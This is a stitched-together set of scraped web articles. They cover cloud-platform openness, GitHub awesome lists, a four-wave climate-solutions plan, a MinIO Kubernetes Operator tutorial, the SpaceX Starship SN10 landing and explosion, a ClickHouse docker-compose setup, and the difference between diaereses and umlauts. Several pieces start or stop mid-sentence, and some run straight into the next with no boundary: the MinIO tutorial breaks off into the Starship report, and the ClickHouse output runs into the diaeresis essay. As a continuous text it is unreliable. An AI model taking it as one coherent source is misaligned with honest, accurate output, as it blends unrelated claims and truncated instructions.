<p>What exactly does open mean when it's applied to the cloud? In the modern software engineering world, there's a tendency to value "openness" over all else, and sometimes we act as if the "open" in open source can be just as easily applied to other parts of the engineering stack.</p>
<p>But open source and open clouds are totally different concepts, even if they both contain the word "open." Even if a cloud provider claims to have an open cloud, it should be obvious to everyone that the cloud infrastructure is not maintained by a global community of volunteers who do not monetize their efforts.</p>
<p>Cloud "openness" is often misunderstood, sometimes because companies intentionally mislead us about what is and is not open, sometimes because as an industry we try to oversimplify very complex offerings and technology. Word choice hurts us, too. The linguistic similarities with "open source", and the fact that "open" and "closed" are usually presented as binary options rather than a spectrum, make it easier to misconstrue the realities of an "open" cloud.</p>
<p>Oversimplifying and/or misunderstanding what openness really means in the context of a cloud environment can lead organizations to make poor decisions about technology choices, leading to wasted time and wasted money. Here's what organizations should consider when they think about how to evaluate how open a cloud is - and whether or not that even matters.</p>
<h2>"Open" is a spectrum</h2>
<p>The openness of any platform, cloud or service is a measure of how locked in customers are, which itself is little more than a calculation of how much it would cost, in terms of time, money and headache, to migrate off of the platform or cloud.</p>
<p>Cloud providers might talk about being "open", but there are no completely open clouds. After all, while talking about how open their clouds are, all the cloud providers charge for egress traffic.</p>
<p>This can't be just about their own cost of maintaining the underlying technology: ingress traffic is free. If the dedication to a truly open cloud were real, moving out would be just as free as moving in.</p>
<p>One of the problems with the term "open cloud" is that it encourages people to think of "openness" as a binary: either a cloud is open or it is closed. But openness is a spectrum, not a binary. The extremes of completely open or completely closed don't exist: Migration costs are never zero. It is also never impossible to migrate off a cloud or platform, though it can be extremely expensive.</p>
<h2>What factors make a cloud more or less open</h2>
<p>So how do we evaluate where on the openness spectrum a particular cloud is? The most open of open clouds will always have the following characteristics:</p>
<ul>
<li>Built on open source</li>
<li>Facilitate data openness, including having tools that make it easier to access, process and move data</li>
<li>Use open APIs, use standard interfaces and adopt open standards.</li>
</ul>
<p>However, even a cloud that meets all of those requirements is not fully "open", in other words, the cost of migrating off that cloud would not be zero. Here are the factors that organizations should evaluate to see where a particular cloud or other platform falls on the openness spectrum:</p>
<p><strong>How much glue is holding the open source components together?</strong> Just because a cloud is based on open source does not mean that creating the same experience or functionality elsewhere is easy. There are always custom, proprietary scripts holding everything together and making the open source software easier to use and more reliable. The more proprietary glue the less open the cloud.</p>
<p><strong>Data portability.</strong> Data has gravity. Moving data can be both time-consuming and costly. How easy it is to move data out of a cloud environment is one of the most important factors when determining how open the cloud is.</p>
<p><strong>Additional services.</strong> All of the cloud providers offer all kinds of add-on services, from secrets management to monitoring and logging. Each service you use increases your lock-in, making it harder for you to migrate elsewhere. The more proprietary services you use, the less open the cloud is. Some services will be more open than others, and it's useful to evaluate openness not just of the entire cloud provider but also of each individual service the organization uses.</p>
<p><strong>What skills are required?</strong> Lastly, there is a skills component to cloud openness. Not all organizations have highly skilled engineering teams. The more sophisticated your team, the easier it would be to move away from any particular cloud and the less reliant the organization is on managed services.</p>
<h2>Making better choices</h2>
<p>When organizations buy into the idea of a binary open/closed cloud, they are skipping over all the details about what makes a cloud more or less open, and ultimately failing to thoroughly evaluate what is and is not important for their organization. Good decision making always requires a complete understanding of both the available options as well as the organization's strengths, weaknesses and priorities.</p>
<p>It would be a mistake to assume that the more open a cloud is the better. For many - probably most - organizations, worrying about cloud lock-in is a distraction that can prevent the engineering team from taking advantage of the cloud's agility, speed and cost savings. Sure, a few companies might derive a competitive advantage from infrastructure management, but they are rare. In most cases, organizations who insist on making their cloud environment as open as possible find themselves spending valuable engineering time managing open source software and rolling their own services that could be purchased off-the-shelf from the cloud provider.</p>
<p>Instead of thinking about whether or not a cloud is open, an engineering leader should evaluate your organization's priorities: Where is openness important? Where is it not? How well do the services you consume from your cloud provider fit with your organization's priorities? That will give you a better place to start when evaluating which cloud provider has the right balance of open source, proprietary programs, out-of-the-box services and barriers to migrating away and ultimately lead to better cloud-related business decisions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>What is an awesome list? <strong>Have you ever felt there is so much information about a topic, or maybe there are too many options to choose from when you are searching for something?</strong> Imagine that you have a list of everithing you need to know to get into a specific topic.</p>
<p>In this post I will introduce you the concept of an awesome list and showing you some of them I really like.</p>
<h2 id="listing-awesome-stuff">Listing awesome stuff</h2>
<p>Imagine you have no idea about Java, but you want to get started with it. Of course, you would ask someone that has a good knowledge in Java, so they can point where you could get started. Instead, imagine a lot of experienced people makes a list of things you should know about Java.</p>
<p><strong>This is an awesome list: a list of awesome stuff you should know about a specific topic.</strong></p>

    <p><img src="https://martinord.eu/img/awesome-lists/awesome.svg" alt="Awsome logo"></p><h3 id="where-it-all-started">Where it all started</h3>
<p>Awesome lists started at <a href="https://github.com/sindresorhus/awesome">sindresorhus' repo</a>. They explain <a href="https://github.com/sindresorhus/awesome/blob/main/awesome.md">how awesome lists work</a>:</p>
<blockquote>
<p>Research if the stuff you’re including is actually awesome. Only put stuff on the list that you or another contributor can personally recommend. You should rather leave stuff out than include too much.</p>
</blockquote>
<blockquote>
<p>Apart from suggesting a particular item on your list, you should also inform your readers why it’s on the list and how they will benefit from it.</p>
</blockquote>
<p>In this repo, <strong>you will find a list of awesome lists</strong>. It would work as the index of “awesome knowledge”. However, there is already a topic on this in Github: <a href="https://github.com/topics/awesome">https://github.com/topics/awesome</a>.</p>
<h3 id="finding-technology-solutions">Finding technology solutions</h3>
<p>These lists are a good starting point of getting started with a subject. This can be from learning a new programming language to get a quick insight in Artificial Intelligence. What is more, <strong>awesome lists are also a good repository of technology solutions</strong> for your project or tools you would otherwise not find easily.</p>

    <p><img src="https://martinord.eu/img/awesome-lists/example-list.png" alt="Awsome list example"></p><h3 id="contributions-and-maintenance">Contributions and maintenance</h3>
<p><strong>These lists are usually maintained by the community</strong>. A lot of experts, that may also use this list as a handy index of knowledge in their field, continually send <em>Pull Requests</em> for contributing to the list so it gets updated from time to time.</p>
<h2 id="some-cool-examples">Some cool examples</h2>
<p>Now you know about these lists, you can start surfing Github and <em>staring</em> your favorite ones. I will point you out some I have found quite interesting.</p>
<h3 id="cybsersecurity">Cybsersecurity</h3>
<p>Of course, I will start with my favorite field: <strong>Cybersecurity</strong>. There are many lists on this field so, as you could have guessed, here is a list of lists :D</p>
<p><strong><a href="https://github.com/Hack-with-Github/Awesome-Hacking">Awesome Haking</a> is a list of lists on Cybersecurity.</strong></p>
<figure>
    <img src="https://martinord.eu/img/awesome-lists/awesome_hacking.jpg" alt="Awsome hacking"> <figcaption>
            <p>Image: Header of the Awesome Hacking list.</p>
        </figcaption>
</figure>

<p>In this list you will find lists on different topics. Here are some of them:</p>
<ul>
<li><strong>Books, documents …</strong>: <a href="https://github.com/sbilly/awesome-security">https://github.com/sbilly/awesome-security</a></li>
<li><strong>Web Security</strong>: <a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a></li>
<li><strong>Learning Infosec</strong>: <a href="https://github.com/onlurking/awesome-infosec">https://github.com/onlurking/awesome-infosec</a></li>
<li><strong>Forensics</strong>: <a href="https://github.com/Cugu/awesome-forensics">https://github.com/Cugu/awesome-forensics</a></li>
</ul>
<h3 id="self-hosted-technology">Self-hosted technology</h3>
<p>Probably my favorite awesome list is <a href="https://github.com/awesome-selfhosted/awesome-selfhosted">Awesome Self-hosted</a>. <strong>Here you will find many applications and software you can host yourself with your private server</strong>:</p>
<figure>
    <img src="https://martinord.eu/img/awesome-lists/self-hosted.jpg" alt="Self-hosted"> <figcaption>
            <p>Image: Self-hosted solutions.</p>

<ul>
<li>Cloud applications</li>
<li>Email services</li>
<li>Proxy services</li>
<li>Games</li>
<li>DNS</li>
<li>…</li>
</ul>
<h3 id="privacy">Privacy</h3>
<figure>
    <img src="https://martinord.eu/img/awesome-lists/privacy.png" alt="Awesome privacy"> <figcaption>
            <p>Image: Awesome Privacy list.</p>
        </figcaption>
</figure>

<p>Another list I find really interesting is the <a href="https://github.com/pluja/awesome-privacy">Awesome Privacy</a> list. <strong>In this list, they point out some technology solutions to safeguard your privacy: what you should and you should not use</strong>.</p>
<h3 id="development">Development</h3>
<p>Finally, you can <strong>also find some lists with everything you should know about a programming language</strong>. Here are some examples:</p>
<ul>
<li><strong>NodeJS</strong>: <a href="https://github.com/sindresorhus/awesome-nodejs">https://github.com/sindresorhus/awesome-nodejs</a></li>
<li><strong>Flutter</strong>: <a href="https://github.com/Solido/awesome-flutter">https://github.com/Solido/awesome-flutter</a></li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Awesome lists are awesome. They are a way of gathering knowledge about a topic, in an Open Source manner. Some of them are a bit abandoned, while many others are daily updated. Therefore, <strong>before searching on Google for the topic, just search for an awesome list fist: it will tell you what you need to google :D</strong></p>
<p><strong>Obri!</strong> You can now start surfing on this knowledge!</p>

Each one of these “waves” needs to <em>begin</em> <em>today</em> — but they unfold differently and yield results over time.</p></div></section><section><div><div><p id="2105"><span>To</span> understand this, it is important to see that <strong>each family of climate solutions has a <em>characteristic timescale</em></strong><em> </em>associated with it. That is, climate solutions tend to cluster into different categories, each with its own sequencing and pace.</p><p id="f27b">For example, some actions can return <em>rapid</em> results, like radically improving energy efficiency, stopping deforestation, or capping methane leaks and black carbon emissions. Others make steady progress as we upgrade the world’s infrastructure — electrifying millions of buildings and vehicles and changing practices on millions of farms and ranches across the globe. Some others are naturally slower, like sequestering carbon by planting trees or regenerating soils, which build up over decades. And some solutions could be game-changers in the future but still require decades of research and development to come to fruition.</p></div></div></section><section><div><div><p id="04a3"><span>I</span> think <strong>we need <em>all</em> these solutions — pursued in parallel</strong>. The challenge is to <em>weave them together over time</em>, to make the most progress possible, decade by decade.</p><p id="5423">Below, I have organized climate solutions into <strong><em>four major waves of action</em></strong>, which I think can play out in different ways.</p></div></div></section><section><div><div><p id="4fc7">To dramatically cut emissions in the 2020s, we need aggressive and immediate action. Fortunately, there are solutions that can help with this.</p><p id="e636">Some “Quick Win” solutions focus on <strong>halting highly destructive practices, </strong>such as widespread deforestation, flaring and fugitive emissions of methane, and “black carbon” emissions from dirty cookstoves, biomass burning, and other sources. The moment we stop these practices, their emissions cease too. And reducing methane and “black carbon” emissions helps a great deal in the short term, as they pack a huge warming punch up front, while carbon dioxide warms more gradually. In other words, cutting methane and black carbon emissions now buys us time while we tackle other emissions.</p><p id="ce81">Other “Quick Win” solutions <strong>focus on efficiency and waste,</strong> which can also achieve rapid emissions reductions. There are <em>enormous</em> opportunities to be more efficient in electricity use (especially in buildings and industrial processes), industry (through better management of waste and materials, especially refrigerants), transportation (increased fuel efficiency and alternative transportation), and buildings (with weatherization, insulation, building automation, and preventing refrigerant leaks). And in the food sector, we should dramatically cut food waste (~30–40% of the world’s food is <em>never</em> eaten), which can also greatly lower emissions.</p><p id="6379">There are obstacles to implementing all of these solutions, of course, but they offer large and immediate emissions reductions, plus strong economic returns. They are among the lowest hanging fruits, and that’s what we need for immediate results.</p></div></div></section><section><div><div><p id="70e3">In addition to “Quick Wins”, we simultaneously need to start replacing old infrastructure with new, low-emitting systems.</p><p id="3278">To begin, we have to <strong>shut down fossil fuel energy sources</strong> and <strong>deploy renewable energy</strong> across the planet as quickly as possible. But given the enormous physical infrastructure and capital involved, this will inevitably take time. Even the most aggressive scenarios of this energy transition require the 2020s and 2030s to complete.</p><p id="51cb">Beyond phasing out fossil fuels and replacing them with renewables, we will simultaneously have to <strong>electrify everything</strong>. That means updating nearly every building on Earth so that heating and cooling systems are using renewable electricity. We will also have to retire nearly every vehicle on Earth, replacing them with electric bikes, cars, trucks, and trains.</p><p id="a686">And we will have to change <strong>almost every farm and ranch</strong> on Earth, transitioning them from highly-emitting farming techniques to low-emissions methods, including so-called regenerative practices.</p><p id="c5d6">We need to get started on all of these big transitions <em>today</em>, but given the massive infrastructure (and capital) turnover involved, this is going to take a concerted effort over two or three decades to accomplish. It reminds me of the old joke: <em>Question: What’s the best time to get started? Answer: 30 years ago. Question: What’s the second-best time to get started? Answer: Today.</em></p></div></div></section><section><div><div><p id="eadb">The only viable paths to address climate change require we eventually bring emissions to zero. But <strong>we can also create carbon sinks </strong>— especially <a rel="noopener" href="https://globalecoguy.org/carbon-offsets-should-make-you-nervous-9995a00db0d6">using nature-based carbon removal</a> approaches — that <em>absorb</em> some of our emissions, or even begin to remove some of our past pollution.</p><p id="721d">To do this, we must start by<strong> protecting Earth’s <em>existing</em> carbon sinks</strong>, found in forests and the ocean. While we want to build <em>additional</em> carbon sinks, we first need to ensure that existing sinks — which remove ~55% of our carbon dioxide emissions and ~40% of our total greenhouse gas emissions — are maintained. If these start to decline, we will be under even more pressure to cut emissions and create other carbon sinks.</p><p id="6c5c">Beyond protecting nature’s <em>existing</em> carbon sinks, we can start to <strong>add new ones by restoring ecosystems</strong>, especially by planting trees. There are discussions about planting billions and billions of trees to absorb some of our remaining emissions. However, the merits and practicality of these schemes are still hotly debated. In addition to tree planting, <strong>we could use regenerative farming practices </strong>on croplands, pastures, and degraded lands — building back carbon in the soils and vegetation, creating new carbon sinks. There are debates about the effectiveness of these solutions, but there is enormous potential for carbon uptake on our working lands.</p><p id="2f8b">This wave of climate solutions is, by its very nature, steady and gradual, playing out over decades. Protecting nature’s current carbon sinks and adding new ones is a long-game, based on building carbon stocks in trees and soil. We should start this work today and continue to protect our natural ecosystems and regeneratively manage our working lands through the next few decades and beyond.</p></div></div></section><section><div><div><p id="62eb">The other waves can address <em>most</em> of our emissions and create <em>significant</em> new carbon sinks. But there are areas that are <strong>difficult to decarbonize</strong> and will require new technology. And there are opportunities to use technology to <strong>remove carbon from the atmosphere</strong> beyond what nature-based solutions can do. This is where focused research and development efforts, starting today, could pay off in the long run.</p><p id="3e7a">This wave of climate solutions depends on new technology, but as an “end game” move in the <a rel="noopener" href="https://globalecoguy.org/we-need-to-see-the-whole-board-to-stop-climate-change-98be66412281">climate chess match</a>. These will take time to develop, so we should rely on other, existing solutions in the next two decades, leaving these new technologies for the final moves.</p><p id="df23">Specifically, I think we need to focus on research and development, starting today, to <strong>make carbon-free cement, steel, plastic, and jet fuel</strong>. There are pilot projects to do this today, but they are far from economically competitive and scalable. But with some significant investment, I am confident we can find good, cheap, reliable ways to do this in the coming decades.</p><p id="8601">In addition, there are interesting ideas about <strong>removing carbon from the atmosphere using a variety of industrial and chemical processes</strong>. At present, these are only small pilot projects, not nearly enough to make a dent in the atmosphere. But with a decade or two of additional research and development, these technologies may mature to be able to remove our last, hard-to-decarbonize emissions in the 2040s.</p><p id="64d5">A (potentially big) mistake would be to let the promise of carbon removal technology be an excuse to delay immediate emissions cuts. These technologies are likely decades away and only absorb some of our final emissions. That’s where they should focus.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3840/1*pwgdIQxD3TEwtobNayeMcQ.png" width="1920" height="1080" srcset="https://miro.medium.com/max/552/1*pwgdIQxD3TEwtobNayeMcQ.png 276w, https://miro.medium.com/max/1104/1*pwgdIQxD3TEwtobNayeMcQ.png 552w, https://miro.medium.com/max/1280/1*pwgdIQxD3TEwtobNayeMcQ.png 640w, https://miro.medium.com/max/1456/1*pwgdIQxD3TEwtobNayeMcQ.png 728w, https://miro.medium.com/max/1632/1*pwgdIQxD3TEwtobNayeMcQ.png 816w, https://miro.medium.com/max/1808/1*pwgdIQxD3TEwtobNayeMcQ.png 904w, https://miro.medium.com/max/1984/1*pwgdIQxD3TEwtobNayeMcQ.png 992w, https://miro.medium.com/max/2000/1*pwgdIQxD3TEwtobNayeMcQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*pwgdIQxD3TEwtobNayeMcQ.png?q=20"></p></div></div></div><figcaption>A hypothetical example of how four different “waves” of climate solutions might unfold over time.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>Object storage as a service is the hottest concept in storage today. The reason is straightforward: object storage is the storage class of the cloud and the ability to provision it seamlessly to applications or developers makes it immensely valuable to enterprises of any size. <br></p><p>The challenge is that object storage as a service has traditionally been very difficult to deliver. Overly complex, hard to tune for performance, prone to failure at scale etc. While systems like Kubernetes offer powerful tools for automating the deployment and management of these systems, the overall problem of <em>complexity</em> remains unsolved as administrators must still invest significant time and effort to deploy even a small scale object storage resource.<br></p><p>By combining Kubernetes with our new Operator and our Operator Console graphical user interface, MinIO is changing that dynamic in a big way. It should be stated upfront that MinIO has always obsessed over simplicity. It permeates everything we do, every design decision we make, every line of code we write.</p><p>Nonetheless, we saw even more opportunity for simplification. To do this we created the MinIO Operator and the MinIO kubectl plugin to facilitate the deployment and management of MinIO Object Storage on Kubernetes. While the Operator commands were critical for users already proficient with Kubernetes, we also wanted to address a wider audience so we created a Graphical User Interface for the Operator and incorporated it into our new MinIO Operator Console to enable anyone in the organization to create, deploy and manage object storage as a service.</p><p>Kubernetes is the platform of the Internet. Given its massive adoption, we chose to remain consistent with the Kubernetes way of doing things. This meant not using any specialized tools or services to setup MinIO. <br></p><p>The effect is that the MinIO Operator works on any Kubernetes distribution, be it OpenShift, vSphere 7.0u1, Rancher or stock upstream. Further, MinIO will work on any public cloud provider such as Amazon's EKS (Elastic Kubernetes Engine), Google's GKE (Google Kubernetes Engine), Google's Anthos or Azure's AKS (Azure Kubernetes Service). <br></p><p>Pretty much all you need to get started on any distribution of Kubernetes is some storage device that can be presented to Kubernetes either via Local Persistent Volumes or with a CSI Driver.<br></p><p>Let’s start with a review on using MinIO with the kubectl plugin and a kustomize based approach. You'll need to install the kubectl tool on a computer with network access to the Kubernetes cluster. See <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Install and Set Up kubectl</a> for installation instructions. You may need to contact your Kubernetes administrator for assistance in configuring your kubectl installation for access to the Kubernetes cluster.</p><h3 id="installation">Installation</h3><p><strong>kubectl plugin</strong></p><p>To install MinIO Operator we can leverage it's <em>kubectl plugin</em> which can be installed via <em>krew</em></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl krew install minio</span></p></td></tr></tbody></table><!--kg-card-end: html--><p><br>After which we can install the Operator by simply doing<br></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl minio init</span></p></td></tr></tbody></table><!--kg-card-end: html--><p><br><strong>Installation with kustomize</strong><br></p><p>Alternatively for anyone who prefers a kustomize based approach our repository supports installing specific tags, of course you can also use this as the base for your <strong>kustomization.yaml</strong> file<br></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl apply -k github.com/minio/operator/\?ref\=v4.0.0</span></p></td></tr></tbody></table><!--kg-card-end: html--><h3 id="provisioning-object-storage">Provisioning Object Storage</h3><p>The analogy we used to represent a MinIO Object Storage cluster is <strong>Tenant. </strong>We did this to communicate that with the MinIO Operator one can allocate multiple Tenants within the same Kubernetes cluster. Each tenant, in turn, can have different capacity (i.e: a small 500GB tenant vs a 100TB tenant), resources (1000m CPU and 4Gi RAM vs 4000m CPU and 16Gi RAM) and servers (4 pods vs 16 pods), as well a separate configurations regarding Identity Providers, Encryption and versions.<br></p><div><p>Let's start by creating a small tenant with <strong>16Ti </strong>capacity across 4 nodes.

<p>The 10th SpaceX Starship prototype, the SN10 was tested for a 10km high-altitude  flight at the spaceflight company’s Boca Chica, Texas launch site. This time SpaceX was able to successfully land the Starship back to the landing pad <a href="https://www.teslaoracle.com/2021/02/03/starship-sn9-completes-successful-test-flight-landing-still-a-challenge-for-spacex/">contrary to the SN9</a> and <a href="https://www.teslaoracle.com/2020/12/14/elon-musk-and-the-spacex-team-inspects-the-remains-of-starship-sn8/">SN8 landing</a> failures.</p>



<p>Like the SN9 prototype, the Starship SN10 perfectly reached the intended altitude of 10 km, all three Raptor engines were shut down one-by-one to perform the belly-flop. The descent of the Starship was also flawless this time and re-ignition of the Raptor engines at 2 km height was also successful.</p>



<p>A Starship prototype has landed back on the landing pad for the first time and this should be considered a success for SpaceX not a failure. </p>



<p>By looking at the landing footage from the ground camera time and time again I was able to see some unusual flames around the engine exhausts, comparing it to the SN9 landing, it seems fairly unusual (see side-by-side photo below).</p>

<p>Although <a href="https://www.teslaoracle.com/tag/starship/">Starship</a> Serial Number 10 (SN10) stood vertical on the landing pad for a few minutes then the explosion from the engine compartment made the spaceship prototype jump high into the air. </p>



<p>This explosion can be seen in the video of Boca Chica observer Trevor Mahlman’s video below, I took the following screenshot from his video showing the fire erupting from the tail-end. <a href="https://www.teslaoracle.com/topic/spacex/">SpaceX</a> removed the explosion part from the Starship SN10 high-altitude test flight official video (also below).</p>

<p><strong>Update:</strong> As we suspected, the newer closeup footage of SN10 landing and further explosion shows the engine bay was actually on fire. Looks like a methane vent leaked and due to the high temperature and the presence of supporting factors, the fire further spread inside SN10, the explosion was enormous.</p>



<p>Some think that this happened due to the tiny short legs of the SN10 and the landing speed was still more than it should have been. Comparatively, SN9 restarted engines at 1.5 km for landing and SN10 did the vertical flip maneuver at 2 km. SpaceX might need to prepare for landing a bit sooner than even 2 km perhaps.</p>



<p>Elon Musk said “SN10 is in Valhalla now” — let’s watch its glorious demise from the closes view of the landing pad.</p>

<h2>How tall is the Starship?</h2>



<p>Starship spaceship without the Superheavy rocket booster has a height of ~52 meters — this is taller than a 13 story commercial or 17 storied residential building which is normally ~50 meters tall. This megastructure might not look that big on the screen but landing the Starship back on the ground is one of the most complex engineering challenges humanity has ever faced.</p>



<p>With the Superheavy rocket booster attached, the height of Starship will be 124 meters, even taller than NASA’s mighty <a href="https://www.space.com/12944-worlds-tallest-rockets-comparison.html" target="_blank" rel="noreferrer noopener">Saturn V</a>.</p>



<p>3D artist <a href="https://twitter.com/nickhenning3d" target="_blank" rel="noreferrer noopener nofollow">Nick Henning</a> rendered a height comparison picture of different structures functioning at SpaceX Boca Chica launch site. Here’s the list with relevant heights;</p>



<ul><li>Starhopper 18 m</li><li>Onion tent 21 m</li><li>Low bay 30 m</li><li>Mid bay 47 m</li><li>Starship prototype 52 m</li><li>High bay 81 m</li><li>Superheavy booster 72 m</li><li>Orbital launchpad/tower 156 m (estimated)</li><li>Starship/booster stack 124 m</li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>ClickHouse is an open-source column-oriented DBMS (developed by 
Yandex). <b>ClickHouse works 100-1000x faster than traditional approaches.</b> 
It's good for Big Data, business analytics and time series data. ClickHouse
 is the first open source SQL data warehouse to match the performance, 
maturity, and scalability of proprietary databases like Sybase IQ, 
Vertica, and Snowflake.<br></p><p>In this little tutorial, I will show you how to install ClickHouse with minimal settings.</p><p><i>For this tutorial, we will need Docker and docker-compose to be installed.</i></p><p>First, you need to create a directory in which to create the necessary files and directories.<br></p>

<pre>cd /home/username
mkdir my-clickhouse
cd my-clickhouse
</pre><p>

Then you need to create a directory in which ClickHouse data will be stored.
</p>
<pre>mkdir db</pre>

<p>The final step is to create the docker-compose.yml file.</p>

<pre>version: '3'

services:
  ch_server:
    image: yandex/clickhouse-server
    ports:
      - "8123:8123"
    volumes:
      - ./db:/var/lib/clickhouse
    networks:
        - ch_ntw

  ch_client:
    image: yandex/clickhouse-client
    entrypoint:
      - /bin/sleep
    command:
      - infinity
    networks:
        - ch_ntw

networks:
  ch_ntw:
    driver: bridge
    ipam:
      config:
        - subnet: 10.222.1.0/24</pre>


<p>Let's check what we did. One file (docker-compose.yml) and one directory (db).<br></p>
<pre>ls -la

drwxr-xr-x 3 user user 4096 Mar  4 07:44 .
drwxr-xr-x 4 user user 4096 Mar  4 07:43 ..
drwxr-xr-x 3 user user 4096 Mar  4 07:45 db
-rw-r--r-- 1 user user  435 Mar  4 07:46 docker-compose.yml</pre><p>That's it!
</p><p>Now let's start our Clickhouse Server. The ClickHouse image will download itself and the process will start.
</p><pre>sudo docker-compose up -d</pre><p>

Now let's open the command line.
</p>
<pre>sudo docker-compose exec ch_server clickhouse-client</pre><p>We should see the result of running ClickHouse.<br>
</p><pre>ClickHouse client version 21.2.5.5 (official build).
Connecting to localhost:9000 as user default.
Connected to ClickHouse server version 21.2.5 revision 54447.

<p>Congratulations, ClickHouse is installed successfully.</p><p>This is a very simple guide to playing with ClickHouse DB. I will probably write a more serious guide on how to configure ClickHouse later.<br>

	<!-- .post-meta -->

		<p>Several weeks ago, the satirical viral content site Clickhole posted this article: <a href="https://news.clickhole.com/going-rogue-the-new-yorker-has-announced-that-they-r-1841068853" rel="noopener noreferrer" target="_blank">“Going Rogue: ‘The New Yorker’ Has Announced That They’re Going To Start Putting An Umlaut Over Every Letter ‘O’ And No One Can Stop Them”</a>. I’ve long enjoyed poking at the <i>New Yorker</i> for its distractingly idiosyncratic style,* but I had a couple of quibbles with the article, so I <a href="https://twitter.com/ArrantPedantry/status/1219709462912438272" rel="noopener noreferrer" target="_blank"> took to Twitter</a> to explain the history of those little dots.</p>
<p>First off, those little dots that appear in words like <i>coöperation</i> aren’t umlauts: they’re diaereses. But a few paragraphs into the article, they actually correct the headline with this fake quote from <i>New Yorker</i> editor David Remnick: “We already know some of you don’t like the dots. You probably call them umlauts. Well, you’re wrong: They’re actually called diaeresis, so try thinking twice before trying to correct us on how we use them.” But this just introduced another problem: <i>diaeresis</i> is the singular form. The plural form is <i>diaereses</i>. That is, the second <i>o</i> in <i>coöperate</i> has a diaeresis over it, but you’d say that the <i>New Yorker</i> uses diaereses in words with doubled vowels.</p>
<p>A diaeresis is a pair of dots that appear over a vowel to indicate that the vowel is pronounced separately from an adjacent vowel. For example, in English <i>oo</i> is generally pronounced as a single vowel sound, usually either the /u/ sound in <i>boot</i> or the /ʊ/ in <i>book</i>. The <i>New Yorker</i> puts a diaeresis over the repeated vowel in words like <i>cooperate</i> to show that those two <i>o</i>’s are pronounced as two distinct vowels. This also applies to other words with repeated vowels like <i>reelect</i>.</p>
<p>English doesn’t use very many diacritical marks, and the ones that it does use are almost entirely from foreign borrowings. But the diaeresis is uncommon in English even compared to other diacriticals. It mostly appears in French borrowings like <i>naïveté</i> (though <i>naïve</i> is often simplified to <i>naive</i>), where it serves the same purpose: showing that the two adjacent vowels are pronounced separately and not as a diphthong or a single long vowel. (In French, for example, <i>ai</i> is pronounced with the /ɛ/ sound in <i>bet</i>, so without the diaeresis, <i>naive</i> would be pronounced like Neve Campbell’s first name.)</p>
<p>The diaeresis goes all the way back to Ancient Greek, where it was also used the same way. Its first use, though, was to separate a vowel at the start of a new word from a vowel at the end of a preceding word, because Greek was originally written without any spaces between words. The word <i>diaeresis</i> comes from the Ancient Greek word for ‘division’, from <i>diairein</i> ‘to divide, separate’, from <i>dia</i>– ‘apart’ + <i>hairein</i> ‘take’. That is, it was simply a mark that divided two words or two adjacent vowels. Some later European languages saw the utility of a mark that indicated that two vowels were meant to be pronounced individually, and they adopted it.</p>
<p>But it has never been common in English outside of the pages of the <i>New Yorker</i>. In <i>Confessions of a Comma Queen</i>, former <i>New Yorker</i> copy editor Mary Norris briefly recounts the rationale behind the magazine’s style choice (excerpted <a href="https://www.merriam-webster.com/words-at-play/mary-norris-diaeresis" rel="noopener noreferrer" target="_blank">here on Merriam-Webster’s website</a>):</p>
<blockquote><p>Basically, we have three options for these kinds of words: “cooperate,” “co-operate,” and “coöperate.” Back when the magazine was just developing its style, someone decided that the first could be misread and the second was ridiculous, and so adopted the third as the most elegant solution with the broadest application.</p></blockquote>
<p>Norris also says that the style editor was on the verge of changing his mind on the diaereses back in 1978, but then he died, and “no one has had the nerve to raise the subject since.” Norris herself admits that “most people would not trip over the ‘coop’ in ‘cooperate’ or the ‘reel’ in ‘reelect'” and that diaereses are number one complaint from readers, but apparently they’re not going anywhere anytime soon. (I think that if you’re afraid to talk about changing your style guide—especially when readers find your style distracting and annoying—then you have either a bad style guide or a bad culture surrounding your style guide or both.)</p>
<p>But on to umlauts. Umlauts look just like diaereses—you could call diaereses and umlauts <a href="https://twitter.com/jessesheidlower/status/1219711424060182528" rel="noopener noreferrer" target="_blank"><i>homoglyphic</i></a>—but they’re used in a very different way and have a distinct origin. The umlaut symbol originated in German but has been borrowed into other languages, including Swedish, Hungarian, Turkish, and Finnish. But to understand what an umlaut does, you need to understand a little bit about where vowels are produced in the mouth.</p>
<p>The vowel /u/ (the sound in “boot”) is a high back vowel: it’s pronounced with the tongue pulled back and the mouth only slightly open so that the tongue is close to the roof of the mouth. The vowel /i/ (the sound in “beet”), on the other hand, is a high <i>front</i> vowel: it’s similarly pronounced with the mouth only slightly open so that the tongue is close to the roof of the mouth, but the tongue is pushed forward instead. If you alternate between saying “oo” and “ee”, you should be able to feel the difference. The vowel /i/ is pronounced a little behind your top front teeth, while /u/ is pronounced towards the soft palate, also known as the velum. (The vowel /u/ is also pronounced with the lips rounded, which has the effect of enhancing the distinction between it and /i/.) And the vowel /a/ (roughly like “ah”, though not every dialect of English has that exact vowel sound) is pronounced with the tongue in the middle or towards the front of the mouth and with the mouth wide open. The International Phonetic Alphabet considers it a low front vowel, but it’s also sometimes treated as a low central vowel.</p>
<p>What an umlaut symbol does, then, is indicate that a vowel is produced further forward in the mouth (and sometimes also higher in the mouth) than normal. For example, <i>ü</i> is pronounced in the same place as /i/, but it retains the lip rounding of /u/. Try saying /i/ or /ɪ/ (“ee” or “ih”) with your lips rounded, and voilà: you just made the sound of the German <i>ü</i>. An <i>ö</i>, by contrast, is like an /e/ or an /ɛ/ (roughly an “ay” or an “eh”) with lips rounded, while an <i>ä</i> is raised to an /e/ or an /ɛ/. (The vowel /a/ doesn’t have any lip rounding, so neither does the umlauted version.)</p>
